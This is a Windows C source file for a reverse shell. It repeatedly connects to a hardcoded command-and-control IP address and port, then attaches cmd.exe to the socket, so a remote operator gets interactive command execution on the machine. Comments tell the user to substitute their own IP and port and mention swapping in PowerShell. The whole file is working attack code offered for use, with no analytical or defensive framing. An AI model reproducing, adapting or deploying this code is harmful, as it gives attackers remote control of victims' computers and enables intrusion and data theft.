#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
#pragma warning(disable:4996) 

void RunShell(char* C2Server, int C2Port) {
    while (TRUE) {

        SOCKET mySocket;
        struct sockaddr_in addr;
        WSADATA version;
        BOOL b_ret;
        WSAStartup(MAKEWORD(2, 2), &version);
        // Creating socket
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);
        // Connecting
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            // Tries again if conenction fails
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                // Can also become powershell
                LPSTR command= "C:\\Windows\\System32\\cmd.exe";
                STARTUPINFOA sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
                b_ret = CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}

int main(int argc, char** argv) {
        puts("Starts");
        char host[] = "54.37.16.220";  // change this to your ip address
        int port = 51251;                //chnage this to your open port
        RunShell(host, port);
    return 0;
}
